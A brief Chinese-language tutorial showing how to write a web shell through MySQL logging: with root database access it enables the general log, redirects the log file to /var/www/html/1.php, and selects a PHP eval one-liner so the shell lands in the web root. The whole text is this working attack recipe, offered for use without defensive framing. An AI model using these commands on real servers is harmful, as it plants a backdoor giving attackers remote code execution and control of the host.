 SQL语句利用日志写shell

在数据库中操作如下：（必须是root权限）

  • show variables like '%general%';  #查看配置

  • set global general_log = on;  #开启general log模式

  • set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址

  • select '<?php eval($_POST[cmd]);?>'  #写入shell
